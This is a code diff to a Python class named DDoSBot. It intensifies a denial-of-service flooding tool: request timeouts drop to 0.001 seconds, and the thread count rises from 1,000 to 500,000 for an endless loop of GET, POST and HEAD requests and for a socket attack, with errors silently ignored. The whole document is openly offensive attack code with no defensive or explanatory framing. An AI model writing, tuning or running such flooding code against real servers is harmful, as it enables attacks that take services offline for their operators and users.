@@ -13,9 +13,9 @@ class DDoSBot:
     def attack(self):
         while self.is_active:
             try:
-                requests.get(self.url, headers=self.headers, timeout=0.1)
-                requests.post(self.url, headers=self.headers, timeout=0.1)
-                requests.head(self.url, headers=self.headers, timeout=0.1)
+                requests.get(self.url, headers=self.headers, timeout=0.001)
+                requests.post(self.url, headers=self.headers, timeout=0.001)
+                requests.head(self.url, headers=self.headers, timeout=0.001)
             except requests.exceptions.RequestException:
                 pass
 
@@ -31,12 +31,12 @@ class DDoSBot:
 
     def start_attack(self):
         threads = []
-        for _ in range(1000):
+        for _ in range(500000):
             thread = threading.Thread(target=self.attack)
             thread.start()
             threads.append(thread)
 
-        for _ in range(1000):
+        for _ in range(500000):
             thread = threading.Thread(target=self.socket_attack)
             thread.start()
             threads.append(thread)
